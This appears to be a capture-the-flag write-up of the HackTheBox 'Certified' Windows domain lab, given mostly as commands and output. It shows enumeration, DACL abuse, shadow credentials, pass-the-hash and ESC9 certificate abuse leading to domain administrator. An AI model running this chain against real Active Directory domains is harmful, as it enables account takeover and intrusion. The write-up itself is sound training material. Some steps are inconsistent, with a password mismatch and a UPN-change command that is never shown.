---
title: Certified HackTheBox
date: 2025-02-14 0:00:00 +0700
layout: post
categories:
  - Hack The Box
tags:
  - writeups
  - ctf
  - medium
  - hackthebox
  - windows
image: 
    path: /assets/img/sample/certified/certified.png
    alt: Certified Machine HackTheBox
---

## Introdution 

As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09


## Enumeration


~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ nmap -sS -sC -sV -Pn -p- 10.10.11.41          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-11 07:25 EST
Nmap scan report for 10.10.11.41
Host is up (0.057s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-11 19:11:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-11T19:13:06+00:00; +6h43m10s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-11T19:13:06+00:00; +6h43m10s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-11T19:13:06+00:00; +6h43m10s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2025-02-11T19:13:06+00:00; +6h43m10s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49739/tcp open  msrpc         Microsoft Windows RPC
62908/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h43m09s, deviation: 0s, median: 6h43m09s
| smb2-time: 
|   date: 2025-02-11T19:12:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 273.30 seconds
~~~

## Active Directory Exploitation

List users in the domain using the provided credential above.

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Certified]
└─$ crackmapexec smb 10.10.11.41 -u "judith.mader" -p "judith09" --rid-brute | grep SidTypeUser
SMB                      10.10.11.41     445    DC01             500: CERTIFIED\Administrator (SidTypeUser)
SMB                      10.10.11.41     445    DC01             501: CERTIFIED\Guest (SidTypeUser)
SMB                      10.10.11.41     445    DC01             502: CERTIFIED\krbtgt (SidTypeUser)
SMB                      10.10.11.41     445    DC01             1000: CERTIFIED\DC01$ (SidTypeUser)
SMB                      10.10.11.41     445    DC01             1103: CERTIFIED\judith.mader (SidTypeUser)
SMB                      10.10.11.41     445    DC01             1105: CERTIFIED\management_svc (SidTypeUser)
SMB                      10.10.11.41     445    DC01             1106: CERTIFIED\ca_operator (SidTypeUser)
SMB                      10.10.11.41     445    DC01             1601: CERTIFIED\alexander.huges (SidTypeUser)
SMB                      10.10.11.41     445    DC01             1602: CERTIFIED\harry.wilson (SidTypeUser)
SMB                      10.10.11.41     445    DC01             1603: CERTIFIED\gregory.cameron (SidTypeUser)
~~~

Using the `bloodhound-python` tool to collect data from Active Directory.


~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Certified]
└─$ bloodhound-python -u judith.mader -p 'judith09' -c all -d "certified.htb" -ns 10.10.11.41
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.certified.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
INFO: Done in 00M 18S 
~~~


I used `bloodhound GUI` import `.json` file I collected in the step above and got the following information.

![](/assets/img/sample/certified/graph.png)

Modify the groups's Management to grant **judith.mader** WriteMembers permission to manage group's members. 

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Certified]
└─$ impacket-dacledit  -action 'write' -rights 'WriteMembers' -target-dn "CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB" -principal "judith.mader" "certified.htb/judith.mader:judith09"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250211-091234.bak
[*] DACL modified successfully!
                        
┌──(trit㉿chimp)-[~/HackTheBox/Certified]
└─$ bloodyAD --host 10.10.11.41 -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"
[+] judith.mader added to Management
~~~

I ran `PyWhisker`, a **Kerberos Authentication** exploit tool in Active Directory. After running the tool, I got a cetificate and password.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Certified]
└─$  python pywhisker.py -d "certified.htb" -u "judith.mader" -p judith09 --target management_svc --action add
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 9dc83e5c-78c8-912a-b013-ca5517dca95e
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: hlKGNdqR.pfx
[*] Must be used with password: V7kTvmXjRw8yDNgaw4s3
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
~~~

> "The clock skew is too great" error in Kerberos
This error occurs due to the time difference between your machine (Kali) and the Domain Controller (certified.htb). Kerberos requires the time between the client and server to match (usually the maximum difference is 5 minutes)
{: .prompt-warning }

- If you are not currently running as the root user, switch to the root user by running the `sudo su` command.
- Run `timedatectl set-ntp off` to disable the Network Time Protocol from auto-updating.
- Run `rdate -n $IP` to match your date and time with the date and time of the your target machine.


I used PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) to obtain a TGT (Ticket Granting Ticket) for the management_svc account. You can download [here](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py).

~~~ bash
┌──(trit㉿chimp)-[~/HackTheBox/Certified]
└─$  python gettgtpkinit.py -cert-pfx hlKGNdqR.pfx -pfx-pass V7kTvmXjRw8yDNgaw4s3 certified.htb/management_svc hhh.ccache

INFO:minikerberos:07229e48b98f6800f3c17aaef3a49815c7b1fff0881969a3756856366a8a87f6

~~~

Sets the environment variable KRB5CCNAME, which tells Kerberos-based tools to use the ticket from **hhh.ccache** instead of requiring a password.

~~~ bash 
┌──(trit㉿chimp)-[~/HackTheBox/Certified]
└─$  export KRB5CCNAME=hhh.ccache
~~~

Extracts the NTLM hash of the management_svc account using the Kerberos TGT obtained earlier. I used `getnthash.py` you can download [here](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py).


~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Certified]
└─$  python getnthash.py -key 07229e48b98f6800f3c17aaef3a49815c7b1fff0881969a3756856366a8a87f6 certified.htb/management_svc

[*] Using TGT from cache
/home/kali/Certified/PKINITtools/getnthash.py:144: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/Certified/PKINITtools/getnthash.py:192: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
~~~

## Lateral Movement

I logged in using `Evil-WinRM`.

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Certified]
└─$ evil-winrm -i certified.htb -u management_svc -H "a091c1832bcdd4677c28b5a6a1295584"
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc> dir


    Directory: C:\Users\management_svc


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/13/2024   9:01 AM                Desktop
d-r---        5/13/2024   9:00 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\management_svc> cd Desktop
*Evil-WinRM* PS C:\Users\management_svc\Desktop> dir


Directory: C:\Users\management_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/12/2025   6:45 PM             34 user.txt


*Evil-WinRM* PS C:\Users\management_svc\Desktop> cat user.txt
88b1cf0c09541ed4f0d941a36a9*****
~~~

## Authenticate with Certificate

Add `DC01.certified.htb` into `/etc/hosts` file.

I discovered that management_svc had **GenericAll** rights over ca_operator. So, I try change ca_operator password.


~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Certified]
└─$ pth-net rpc password "ca_operator" "1122334455" -U "certified.htb"/"management_svc"%"a091c1832bcdd4677c28b5a6a1295584":"a091c1832bcdd4677c28b5a6a1295584"  -S "DC01.certified.htb"
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
~~~

Right after running the command you get a `.json` file open it and find NoSecurityExtension in the **Enrollment Flag** section. So `ESC9` can be used for attack.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Certified]
└─$ certipy-ad find -u judith.mader@certified.htb -p judith09 -dc-ip 10.10.11.41
~~~ 

![](/assets/img/sample/certified/enrollment.png)

Use the Certipy tool to update the NT hash (a091c1832bcdd4677c28b5a6a1295584) to the ca_operator account and change the account's userPrincipalName (UPN) to Administrator

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Certified]
└─# certipy-ad req -username ca_operator@certified.htb -p 12345678 -ca certified-DC01-CA -template CertifiedAuthentication -debug 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'CERTIFIED.HTB' at '192.168.6.2'
[+] Resolved 'CERTIFIED.HTB' from cache: 10.10.11.41
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.41[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.41[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
~~~

> If you are getting "Clock skew too great" error because there is a time difference between the attacker machine and the target machine. Following the step to fix it.
{: .prompt-warning }

- If you are not currently running as the root user, switch to the root user by running the `sudo su` command.
- Run `timedatectl set-ntp off` to disable the Network Time Protocol from auto-updating.
- Run `rdate -n $IP` to match your date and time with the date and time of the your target machine.

I used `certipy-ad` to authentication with certificate **administrator.pfx** just received above.

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Certified]
└─# certipy-ad auth -pfx administrator.pfx -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34

~~~

- Certipy is used for certificate-based authentication in AD.
- You retrieved the NT hash, which can be used for Pass-the-Hash attacks or cracking.

Finally, get root flag 
~~~ shell 
┌──(root㉿chimp)-[/home/trit/HackTheBox/Certified]
└─# evil-winrm -i certified.htb -u 'Administrator' -H '0d5b49608bbce1751f708748f67e2d34'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/12/2025   6:45 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
c3131e3786c4552e480fa293853*****

~~~


***Thank you for readling this far! I hope this writeup helps you in your learning and research.***


